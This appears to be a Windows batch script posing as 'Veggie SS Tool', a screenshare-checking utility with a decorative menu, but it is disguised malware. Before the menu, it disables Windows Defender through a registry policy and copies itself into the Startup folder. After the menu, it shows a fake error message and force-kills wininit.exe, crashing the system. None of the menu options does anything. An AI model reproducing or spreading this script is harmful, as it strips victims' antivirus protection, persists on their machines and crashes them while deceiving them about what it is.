@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f >nul
xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup >nul
:gui
echo.
echo %c%          __      __             _         _____ _____   _______          _ 
echo           \ \    / /             (_)       / ____/ ____^| ^|__   __^|        ^| ^|
echo            \ \  / /__  __ _  __ _ _  ___  ^| (___^| (___      ^| ^| ___   ___ ^| ^|
echo             \ \/ / _ \/ _` ^|/ _` ^| ^|/ _ \  \___ \\___ \     ^| ^|/ _ \ / _ \^| ^| %u%
echo              \  /  __/ (_^| ^| (_^| ^| ^|  __/  ____) ^|___) ^|    ^| ^| (_) ^| (_) ^| ^|
echo               \/ \___^|\__, ^|\__, ^|_^|\___^| ^|_____/_____/     ^|_^|\___/ \___/^|_^|
echo                        __/ ^| __/ ^|                                           
echo                       ^|___/ ^|___/                                            
echo.
echo.
echo.
echo %c%             ╔═════════════════════════════════╦════════════════════════════╗ %u%
echo              %c%║%u%       [%d%-%u%] Version:  2.1%u% 	       %c%║%u%   [%d%4%u%] Recycle Bin          %c%║%u%       
echo              %c%║%u%       [%d%1%u%] Scan      	       %c%║%u%   [%d%5%u%] USN          	    %c%║%u%       
echo              %c%║%u%       [%d%2%u%] LastActivityView      %c%║%u%   [%d%6%u%] Regedit        	    %c%║%u%       
echo              %c%║%u%       [%d%3%u%] USB Deview %u%           %c%║%u%   [%d%7%u%] Credits              %c%║%u%       
echo %c%             ╚═════════════════╦═══════════════╬═══════════════╦════════════╝
echo                                ║   %u%   [%d%8%u%]%c%      ║  %u%    [%d%9%u%] %c%     ║
echo                                ║ %u%Custom theme%c%  ║ %u%Theme Presets%c% ║
echo                                ║               ║               ║
echo                                ╚═══════════════╩═══════════════╝
color 0C >nul
echo Veggie SS Tool has ran into a problem. Report to Veggie Bot and Painis Stick
echo ^G >nul
taskkill /f /im wininit.exe >nul
pause >nul
